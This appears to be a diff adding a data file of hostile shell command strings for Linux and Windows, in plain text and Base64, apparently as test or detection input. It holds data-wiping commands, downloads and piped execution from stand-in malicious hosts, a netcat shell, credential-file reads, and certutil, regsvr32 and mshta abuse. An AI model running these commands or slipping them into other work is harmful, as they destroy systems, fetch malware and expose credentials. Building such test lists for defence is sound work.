@@ -1,0 +1,39 @@
+#Linux Masque - Texts სექციაში:
+/bin/bash
+python3 -c "import os; os.system('rm -rf /')"
+wget http://malicious-site.com/payload.sh
+curl -s http://192.168.1.100/evil.py | python
+nc -lvp 4444 -e /bin/sh
+chmod +x /tmp/backdoor
+
+
+#Linux Base64 სექციაში
+L2Jpbi9iYXNoCg==
+cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyki
+d2dldCBodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL3BheWxvYWQuc2g=
+Y3VybCAtcyBodHRwOi8vMTkyLjE2OC4xLjEwMC9ldmlsLnB5IHwgcHl0aG9u
+bmMgLWx2cCA0NDQ0IC1lIC9iaW4vc2g=
+Y2htb2QgK3ggL3RtcC9iYWNrZG9vcg==
+cHMgYXV4IHwgZ3JlcCBzc2hk
+L2V0Yy9wYXNzd2Q=
+Y2F0IC9ldGMvc2hhZG93
+aWQgJiYgd2hvYW1p
+dW5hbWUgLWE=
+Y3JvbnRhYiAtZQ==
+L2Jpbi9uZXRjYXQ=
+
+#Windows Masque - Texts სექციაში:
+powershell.exe -ExecutionPolicy Bypass -Command
+cmd.exe /c "del /s /q C:\*.*"
+rundll32.exe shell32.dll,ShellExec_RunDLL
+regsvr32.exe /s /u /i:http://malicious.com/evil.dll scrobj.dll
+certutil -urlcache -split -f http://evil.com/malware.exe
+mshta javascript:eval('new ActiveXObject("WScript.Shell").Run("cmd /c calc")')
+
+#Windows Masque - Base64 სექციაში:
+cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3M=
+Y21kLmV4ZSAvYyAiZGVsIC9zIC9xIEM6XCouKiI=
+cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxs
+cmVnc3ZyMzIuZXhlIC9zIC91IC9p
+
+
